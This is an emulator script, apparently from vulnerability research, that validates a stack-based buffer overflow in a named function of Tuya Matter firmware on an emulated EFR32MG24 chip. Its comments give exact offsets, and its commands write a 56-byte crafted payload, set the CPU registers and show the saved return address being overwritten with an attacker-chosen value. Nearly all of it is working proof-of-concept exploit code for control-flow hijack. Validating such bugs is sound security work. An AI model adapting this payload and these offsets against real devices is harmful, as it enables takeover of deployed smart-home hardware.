:name: MT-01 Tuya pid79 Matter sub_804F3DC stack overflow -> saved-LR -- validation
:description: Drives the sub_804F3DC copy routine of the real Tuya pid79 Matter firmware on the emulated EFR32MG24 and demonstrates the unclamped byte-copy loop overwriting the function's own saved return address (stack-based overflow / control-flow hijack).
#
# Bug (sub_804F3DC @0x804F3DC): PUSH.W {R4-R8,LR} (6 regs = 24B) then SUB SP,#0x20.
# After the prologue the DEST buffer base R3 = SP (mov r3,sp @0x804F3F6), so
# buffer = entrySP-24-0x20 = entrySP-0x38 and the saved-LR slot = entrySP-4.
# distance buffer->savedLR = 0x34 = 52 bytes. The copy loop (0x804F418..0x804F43C)
# does dst[i]=src[i] with `strb.w r2,[r3],#1`, breaking early ONLY on a byte==0x2d
# ('-') or when i>=len. len = arg1 = r1 is attacker-controlled and unclamped, so
# len>=56 writes dst[52..55] straight over the 4-byte saved LR.
# Epilogue `ldmia.w sp!,{r4-r8,pc}` @0x804F432 then pops that corrupted slot into PC.
#
# entrySP=0x20010000 => buffer base=0x2000FFC8, saved-LR slot=0x2000FFFC.

$bin=@scripts/silabs-vuln/mt01_tuya.elf
include @scripts/silabs-vuln/boot_mg24.resc

emulation RunFor "0.4"
pause

# --- SRC buffer @0x20008000 (56 bytes) ---
# offsets 0..51 = 0x41 filler (no 0x2d byte to truncate the loop);
# offset 52 (0x34) = 0x20006E01 sentinel (LE bytes 01,6E,00,20 - none is 0x2d,
# and the 0x00 does NOT terminate this loop) -> lands exactly on dst[52..55] = saved LR.
sysbus WriteDoubleWord 0x20008000 0x41414141
sysbus WriteDoubleWord 0x20008004 0x41414141
sysbus WriteDoubleWord 0x20008008 0x41414141
sysbus WriteDoubleWord 0x2000800C 0x41414141
sysbus WriteDoubleWord 0x20008010 0x41414141
sysbus WriteDoubleWord 0x20008014 0x41414141
sysbus WriteDoubleWord 0x20008018 0x41414141
sysbus WriteDoubleWord 0x2000801C 0x41414141
sysbus WriteDoubleWord 0x20008020 0x41414141
sysbus WriteDoubleWord 0x20008024 0x41414141
sysbus WriteDoubleWord 0x20008028 0x41414141
sysbus WriteDoubleWord 0x2000802C 0x41414141
sysbus WriteDoubleWord 0x20008030 0x41414141
sysbus WriteDoubleWord 0x20008034 0x20006E01

# --- Call contract: PC=sink, r0=src, r1=len=0x38, r2=count out-ptr, SP, LR=sentinel ---
sysbus.cpu SetRegister 0  0x20008000
sysbus.cpu SetRegister 1  0x00000038
sysbus.cpu SetRegister 2  0x20009000
sysbus.cpu SetRegister 3  0x00000000
sysbus.cpu SetRegister 13 0x20010000
sysbus.cpu SetRegister 14 0xDEADBEEF
sysbus.cpu PC 0x804F3DC

# Execute the prologue PUSH.W {R4-R8,LR} so the genuine return address is spilled.
sysbus.cpu Step 1
echo "=== BEFORE (after prologue push, PC inside sub_804F3DC) ==="
echo "PC ="
sysbus.cpu PC
echo "saved-LR slot @0x2000FFFC (genuine return addr, expect 0xDEADBEEF) ="
sysbus ReadDoubleWord 0x2000FFFC

# Run the copy loop to completion (writes bytes 0..55 = through dst[52..55]).
# Stop with PC still inside the function, BEFORE the epilogue pop @0x804F432.
sysbus.cpu Step 691
echo "=== AFTER copy loop (PC still inside sub_804F3DC, pre-epilogue) ==="
echo "PC ="
sysbus.cpu PC
echo "saved-LR slot @0x2000FFFC (HIJACKED, expect 0x20006E01) ="
sysbus ReadDoubleWord 0x2000FFFC

# Continue a little further (still pre-epilogue) so the count out-param is stored.
sysbus.cpu Step 68
echo "=== corroboration (still pre-epilogue pop) ==="
echo "saved-LR slot @0x2000FFFC (still 0x20006E01) ="
sysbus ReadDoubleWord 0x2000FFFC
echo "count out-param @0x20009000 (expect 0x38 = full attacker len consumed) ="
sysbus ReadByte 0x20009000
